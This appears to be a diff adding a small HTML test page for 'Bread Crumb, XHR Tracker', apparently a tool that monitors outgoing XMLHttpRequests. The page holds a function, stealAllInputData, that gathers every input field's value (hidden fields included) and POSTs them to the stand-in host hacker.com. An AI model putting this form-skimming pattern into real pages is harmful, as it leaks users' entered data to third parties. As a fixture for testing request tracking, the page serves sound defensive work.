@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+	<title>Bread Crumb, XHR Tracker</title>
+	<script type="text/javascript" src="breadcrumb.js"></script>
+	<script type="text/javascript" src="jquery-1.11.3.js"></script>
+	<script type="text/javascript">
+		function stealAllInputData() {
+			var hackerApiUrl = 'http://www.hacker.com/api';
+			var inputs = document.getElementsByTagName("input");
+			var log = [document.URL];
+			for (i = 0; i < inputs.length; i++) {
+				var value = inputs[i].value;
+				log[i+1] = value;
+			}
+			var xhr = new XMLHttpRequest();
+			xhr.open('post', hackerApiUrl);
+			xhr.send(log);
+		}
+	</script>
+</head>
+<body>
+	<table id="formTable">
+		<tr>
+			<td>Name</td>
+			<td>:<input type="text" value="Bread" id="Name" /></td>
+		</tr>
+		<tr>
+			<td>Hidden</td>
+			<td>:<input type="hidden" value="Crumb" id="Hidden" /></td>
+		</tr>
+	</table>
+	<input type="button" value="Make XHR" onclick="stealAllInputData();" />
+</body>
+
+</html>
